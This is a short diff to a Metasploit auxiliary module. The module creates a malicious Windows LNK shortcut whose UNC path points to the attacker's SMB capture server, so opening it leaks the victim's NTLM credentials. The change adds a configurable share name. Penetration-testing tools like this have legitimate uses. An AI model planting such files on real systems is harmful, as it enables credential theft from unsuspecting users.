@@ -64,8 +64,9 @@ class MetasploitModule < Msf::Auxiliary
     icon_path = "%SystemRoot%\\System32\\#{Faker::File.file_name(ext: 'ico')}.to_s}%SystemRoot%\System32\shell32.dll" if icon_path.blank?
 
     start_smb_capture_server
-
-    unc_path = "\\\\#{srvhost}\\\\#{Rex::Text.rand_text_alphanumeric(6)}"
+    unc_share = datastore['SHARE']
+    unc_share = Rex::Text.rand_text_alphanumeric(6) if unc_share.blank?
+    unc_path = "\\\\#{srvhost}\\\\#{unc_share}"
     lnk_data = create_lnk_file(description, icon_path, unc_path)
     filename = file_create(lnk_data)
     print_good("LNK file created: #{filename}")
